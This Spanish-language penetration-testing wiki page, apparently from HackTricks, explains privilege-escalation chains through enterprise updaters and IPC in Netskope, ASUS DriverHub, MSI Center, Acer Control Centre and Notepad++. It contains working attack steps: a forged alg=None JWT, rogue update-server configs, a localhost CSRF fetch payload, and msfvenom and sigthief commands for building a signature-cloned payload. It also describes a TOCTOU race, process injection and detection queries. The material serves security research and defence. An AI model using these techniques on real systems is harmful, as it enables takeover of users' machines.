# Abuso de actualizadores automáticos empresariales y IPC privilegiado (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalado de privilegios locales en Windows encontradas en agentes de endpoint y actualizadores empresariales que exponen una superficie de IPC de baja fricción y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client for Windows < R129 (CVE-2025-0309), donde un usuario con pocos privilegios puede forzar la inscripción en un servidor controlado por el atacante y luego entregar un MSI malicioso que el servicio SYSTEM instala.

Ideas clave que puedes reutilizar contra productos similares:
- Abusar del IPC localhost de un servicio privilegiado para forzar la re-inscripción o la reconfiguración hacia un servidor del atacante.
- Implementar los endpoints de actualización del proveedor, entregar una Trusted Root CA maliciosa y apuntar el actualizador a un paquete malicioso “signed”.
- Evadir comprobaciones de firmante débiles (CN allow-lists), flags de digest opcionales y propiedades laxas de MSI.
- Si el IPC está “encrypted”, derivar la key/IV a partir de identificadores de máquina legibles por todos almacenados en el registro.
- Si el servicio restringe a los llamantes por image path/process name, inyectar en un proceso en la allow-list o crear uno en estado suspended y bootstrapear tu DLL vía un parche mínimo del thread-context.

---
## 1) Forzar la inscripción a un servidor atacante vía localhost IPC

Muchos agentes incluyen un proceso UI en user-mode que habla con un servicio SYSTEM a través de localhost TCP usando JSON.

Observado en Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flujo de explotación:
1) Crea un token JWT de inscripción cuyas claims controlen el host backend (p. ej., AddonUrl). Usa alg=None para que no se requiera firma.
2) Envía el mensaje IPC invocando el comando de provisioning con tu JWT y el nombre del tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) El servicio empieza a contactar tu rogue server para enrollment/config, p. ej.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Si la verificación del caller se basa en ruta/nombre, origina la solicitud desde un binario del proveedor que esté en la lista de permitidos (ver §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Una vez que el cliente se comunique con tu servidor, implementa los endpoints esperados y dirígelo hacia un MSI del atacante. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve configuración JSON con un intervalo de updater muy corto, p. ej.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado CA en PEM. El servicio lo instala en el Local Machine Trusted Root store.
3) /v2/checkupdate → Proporciona metadata que apunta a un MSI malicioso y una versión falsa.

Evasión de comprobaciones comunes observadas en la práctica:
- Signer CN allow-list: el servicio puede limitarse a comprobar que el Subject CN sea “netSkope Inc” o “Netskope, Inc.”. Tu CA maliciosa puede emitir un certificado leaf con ese CN y firmar el MSI.
- CERT_DIGEST property: incluye una propiedad MSI benigna llamada CERT_DIGEST. No hay aplicación en la instalación.
- Optional digest enforcement: un flag de configuración (p. ej., check_msi_digest=false) desactiva validaciones criptográficas adicionales.

Resultado: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
ejecutando código arbitrario como NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Desde R127, Netskope envolvió el JSON de IPC en un campo encryptData que parece Base64. El reversing mostró AES con key/IV derivados de valores del registro legibles por cualquier usuario:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los atacantes pueden reproducir el cifrado y enviar comandos cifrados válidos desde un usuario estándar. Consejo general: si un agente de repente “encripta” su IPC, busca device IDs, product GUIDs, install IDs bajo HKLM como material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Algunos servicios intentan autenticar al peer resolviendo el PID de la conexión TCP y comparando la ruta/nombre de la imagen contra binarios permitidos del vendor ubicados bajo Program Files (p. ej., stagentui.exe, bwansvc.exe, epdlp.exe).

Dos bypasses prácticos:
- DLL injection en un proceso permitido (p. ej., nsdiag.exe) y proxy IPC desde dentro de él.
- Crear un binario permitido en estado suspended y bootstrappear tu DLL proxy sin CreateRemoteThread (ver §5) para satisfacer reglas de tampering impuestas por drivers.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Los productos suelen incluir un minifilter/OB callbacks driver (p. ej., Stadrv) que elimina derechos peligrosos de handles hacia procesos protegidos:
- Process: elimina PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader en user-mode fiable que respeta estas restricciones:
1) CreateProcess de un binario del vendor con CREATE_SUSPENDED.
2) Obtén los handles que aún puedes: PROCESS_VM_WRITE | PROCESS_VM_OPERATION en el proceso, y un handle de thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME si parcheas código en un RIP conocido).
3) Sobrescribe ntdll!NtContinue (u otro thunk temprano mapeado garantizado) con un stub pequeño que llame a LoadLibraryW con la ruta de tu DLL, y luego salte de regreso.
4) ResumeThread para disparar tu stub in-process, cargando tu DLL.

Porque nunca usaste PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME sobre un proceso ya protegido (tú lo creaste), la política del driver queda satisfecha.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza una rogue CA, la firma de MSI malicioso, y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope es un IPC client personalizado que crea mensajes IPC arbitrarios (opcionalmente AES-encrypted) e incluye la inyección por proceso suspended para originar desde un binario permitido.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub incluye un servicio HTTP en user-mode (ADU.exe) en 127.0.0.1:53000 que espera llamadas del browser provenientes de https://driverhub.asus.com. El filtro de origin simplemente hace `string_contains(".asus.com")` sobre la cabecera Origin y sobre las URLs de descarga expuestas por `/asus/v1.0/*`. Cualquier host controlado por el atacante como `https://driverhub.asus.com.attacker.tld` por tanto pasa la comprobación y puede emitir requests que cambian estado desde JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Flujo práctico:
1) Registra un dominio que incluya `.asus.com` y hospeda una página maliciosa allí.
2) Usa `fetch` o XHR para llamar a un endpoint privilegiado (p. ej., `Reboot`, `UpdateApp`) en `http://127.0.0.1:53000`.
3) Envía el body JSON esperado por el handler – el frontend JS empaquetado muestra el esquema abajo.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Incluso el PowerShell CLI mostrado a continuación tiene éxito cuando el encabezado Origin se falsifica al valor de confianza:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Cualquier visita del navegador al sitio del atacante se convierte, por tanto, en un CSRF local de 1 clic (o 0 clic vía `onload`) que impulsa un helper en contexto SYSTEM.

---
## 2) Verificación insegura de firma de código y clonación de certificado (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` descarga ejecutables arbitrarios definidos en el cuerpo JSON y los cachea en `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la URL de descarga reutiliza la misma lógica basada en subcadenas, por lo que `http://updates.asus.com.attacker.tld:8000/payload.exe` es aceptada. Tras la descarga, ADU.exe únicamente verifica que el PE contiene una firma y que la cadena Subject coincide con ASUS antes de ejecutarlo – no `WinVerifyTrust`, no validación de cadena.

Para weaponizar el flujo:
1) Crear un payload (p. ej., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clonar el signer de ASUS en él (p. ej., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hospedar `pwn.exe` en un dominio lookalike `.asus.com` y disparar UpdateApp vía el CSRF en el navegador descrito arriba.

Debido a que tanto los filtros Origin como URL se basan en subcadenas y la comprobación del signer solo compara cadenas, DriverHub descarga y ejecuta el binario del atacante bajo su contexto elevado.

---
## 1) TOCTOU dentro de rutas de copia/ejecución del updater (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP donde cada frame es `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente core (Component ID `0f 27 00 00`) provee `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su handler:
1) Copia el ejecutable suministrado a `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma vía `CS_CommonAPI.EX_CA::Verify` (el subject del certificado debe ser “MICRO-STAR INTERNATIONAL CO., LTD.” y `WinVerifyTrust` debe tener éxito).
3) Crea una tarea programada que ejecuta el archivo temporal como SYSTEM con argumentos controlados por el atacante.

El archivo copiado no queda bloqueado entre la verificación y `ExecuteTask()`. Un atacante puede:
- Enviar Frame A apuntando a un binario legítimo firmado por MSI (garantiza que la comprobación de firma pase y que la tarea quede encolada).
- Competir con mensajes Frame B repetidos que apunten a un payload malicioso, sobrescribiendo `MSI Center SDK.exe` justo después de que la verificación termine.

Cuando el scheduler se dispara, ejecuta el payload sobrescrito como SYSTEM a pesar de haber validado el archivo original. La explotación fiable usa dos goroutines/threads que spamean CMD_AutoUpdateSDK hasta ganar la ventana TOCTOU.

---
## 2) Abuso de IPC personalizado a nivel SYSTEM e impersonación (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Cada plugin/DLL cargado por `MSI.CentralServer.exe` recibe un Component ID almacenado bajo `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de un frame seleccionan ese componente, permitiendo a atacantes enrutar comandos a módulos arbitrarios.
- Los plugins pueden definir sus propios task runners. `Support\API_Support.dll` expone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` y llama directamente a `API_Support.EX_Task::ExecuteTask()` sin **validación de firma** – cualquier usuario local puede apuntarlo a `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución como SYSTEM de forma determinista.
- Sniffing del loopback con Wireshark o instrumentando los binarios .NET en dnSpy revela rápidamente el mapeo Component ↔ command; clientes personalizados en Go/Python pueden luego reproducir frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expone `\\.\pipe\treadstone_service_LightMode`, y su discretionary ACL permite clientes remotos (p. ej., `\\TARGET\pipe\treadstone_service_LightMode`). Enviar el command ID `7` con una ruta de archivo invoca la rutina de spawning del proceso del servicio.
- La librería cliente serializa un byte terminador mágico (113) junto con los args. La instrumentación dinámica con Frida/`TsDotNetLib` (ver [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para consejos de instrumentación) muestra que el handler nativo mapea este valor a un `SECURITY_IMPERSONATION_LEVEL` y a un integrity SID antes de llamar a `CreateProcessAsUser`.
- Cambiar 113 (`0x71`) por 114 (`0x72`) cae en la rama genérica que mantiene el token SYSTEM completo y asigna un SID de alta integridad (`S-1-16-12288`). El binario spawnedeado por tanto corre como SYSTEM sin restricciones, tanto localmente como cross-machine.
- Combinar eso con la flag de instalador expuesta (`Setup.exe -nocheck`) permite levantar ACC incluso en VMs de laboratorio y ejercitar la pipe sin hardware del proveedor.

Estos bugs de IPC resaltan por qué los servicios localhost deben imponer autenticación mutua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) y por qué el helper de “ejecutar binario arbitrario” de cada módulo debe compartir las mismas verificaciones de signer.

---
## Secuestro remoto de la cadena de suministro vía validación débil del updater (WinGUp / Notepad++)

Los updaters basados en WinGUp antiguos de Notepad++ no verificaban completamente la autenticidad de actualizaciones. Cuando los atacantes comprometían el proveedor de hosting del servidor de actualizaciones, podían manipular el manifiesto XML y redirigir solo a clientes seleccionados a URLs de atacante. Debido a que el cliente aceptaba cualquier respuesta HTTPS sin imponer tanto una cadena de certificado de confianza como una firma PE válida, las víctimas descargaban y ejecutaban un NSIS `update.exe` trojanizado.

Flujo operativo (no se requiere exploit local):
1. Infraestructura interceptada: comprometer el CDN/hosting y responder a las comprobaciones de actualización con metadata del atacante apuntando a una URL de descarga maliciosa.
2. NSIS trojanizado: el instalador descarga/ejecuta un payload y abusa de dos cadenas de ejecución:
- BYO signed binary + sideload: incluir el firmado Bitdefender `BluetoothService.exe` y dejar una `log.dll` maliciosa en su search path. Cuando el binario firmado se ejecuta, Windows sideloadea `log.dll`, que desencripta y carga reflectivamente el backdoor Chrysalis (protegido con Warbird + API hashing para dificultar la detección estática).
- Scripted shellcode injection: NSIS ejecuta un script Lua compilado que usa APIs Win32 (p. ej., `EnumWindowStationsW`) para inyectar shellcode y stagear Cobalt Strike Beacon.

Puntos de hardening/detección para cualquier auto-updater:
- Imponer verificación de **certificado + firma** del instalador descargado (pinnear el signer del vendor, rechazar CN/chain mismatched) y firmar el propio manifiesto de actualización (p. ej., XMLDSig). Bloquear redirecciones controladas por el manifiesto a menos que estén validadas.
- Tratar el **BYO signed binary sideloading** como un pivot de detección post-descarga: alertar cuando un EXE firmado del vendor carga un nombre de DLL desde fuera de su instalación canónica (p. ej., Bitdefender cargando `log.dll` desde Temp/Downloads) y cuando un updater deja/ejecuta instaladores en temp con firmas no-vendor.
- Monitorizar artefactos específicos de malware observados en esta cadena (útiles como pivotes genéricos): mutex `Global\Jdhfv_1.0.1`, escrituras anómalas de `gup.exe` a `%TEMP%`, y stages de inyección de shellcode dirigidos por Lua.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lanzando un instalador que no es Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Estos patrones se generalizan a cualquier updater que acepta unsigned manifests o que no verifica los installer signers — network hijack + malicious installer + BYO-signed sideloading provocan remote code execution bajo la apariencia de “trusted” updates.

---
## Referencias
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
